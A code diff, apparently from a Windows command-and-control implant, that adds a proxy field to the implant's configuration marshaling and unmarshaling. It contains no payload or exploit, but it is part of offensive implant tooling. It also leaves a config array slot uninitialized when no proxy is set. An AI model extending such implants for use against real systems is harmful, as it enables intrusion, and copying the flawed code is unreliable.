@@ -65,6 +65,7 @@ VOID FreeGlobalConfig
 		FREE(pConfig->lpMainExecutable);
 		FREE(pConfig->lpSliverName);
 		FREE(pConfig->lpUniqueName);
+		FREE(pConfig->lpProxy);
 		if (pConfig->hMutex != NULL) {
 			CloseHandle(pConfig->hMutex);
 		}
@@ -831,7 +832,7 @@ VOID MarshalConfig
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	PPBElement ConfigElements[18];
+	PPBElement ConfigElements[19];
 	PPBElement DriveElements[10];
 	PPBElement* DriveList = NULL;
 	PPBElement HttpElements[12];
@@ -845,6 +846,7 @@ VOID MarshalConfig
 	DWORD i = 0;
 	DWORD j = 0;
 	PPBElement FinalElement = NULL;
+	LPSTR lpTemp = NULL;
 
 	ConfigElements[0] = CreateBytesElement(pConfig->lpRecipientPubKey, lstrlenA(pConfig->lpRecipientPubKey), 1);
 	ConfigElements[1] = CreateBytesElement(pConfig->lpPeerPubKey, lstrlenA(pConfig->lpPeerPubKey), 2);
@@ -959,9 +961,16 @@ VOID MarshalConfig
 
 	ConfigElements[16] = CreateVarIntElement(pConfig->Loot, 17);
 	ConfigElements[17] = CreateVarIntElement(pConfig->Clipboard, 18);
+	if (pConfig->lpProxy != NULL) {
+		lpTemp = ConvertWcharToChar(pConfig->lpProxy);
+		ConfigElements[18] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 19);
+	}
+	
 	FinalElement = CreateStructElement(ConfigElements, _countof(ConfigElements), 0);
 	WriteToFile(pConfig->lpConfigPath, FinalElement->pMarshaledData, FinalElement->cbMarshaledData);
+CLEANUP:
 	FreeElement(FinalElement);
+	FREE(lpTemp);
 }
 
 PGLOBAL_CONFIG UnmarshalConfig
@@ -973,7 +982,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	DWORD cbMarshaledData = 0;
 	PGLOBAL_CONFIG pResult = NULL;
 	LPVOID* UnmarshaledData = NULL;
-	PPBElement ConfigElements[18];
+	PPBElement ConfigElements[19];
 	PPBElement DriveConfigElements[10];
 	PPBElement HttpConfigElements[12];
 	PPBElement PivotConfigElements[3];
@@ -1008,6 +1017,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	ConfigElements[15]->Type = RepeatedBytes;
 	ConfigElements[16]->Type = Varint;
 	ConfigElements[17]->Type = Varint;
+	ConfigElements[18]->Type = Bytes;
 	for (i = 0; i < _countof(DriveConfigElements); i++) {
 		DriveConfigElements[i] = ALLOC(sizeof(PBElement));
 		DriveConfigElements[i]->dwFieldIdx = i + 1;
@@ -1099,6 +1109,10 @@ PGLOBAL_CONFIG UnmarshalConfig
 
 	if (UnmarshaledData[17] != NULL) {
 		pResult->Clipboard = TRUE;
+	}
+
+	if (UnmarshaledData[18] != NULL) {
+		pResult->lpProxy = ConvertCharToWchar(((PBUFFER)UnmarshaledData[18])->pBuffer);
 	}
 
 	pResult->Type = (ImplantType)UnmarshaledData[12];
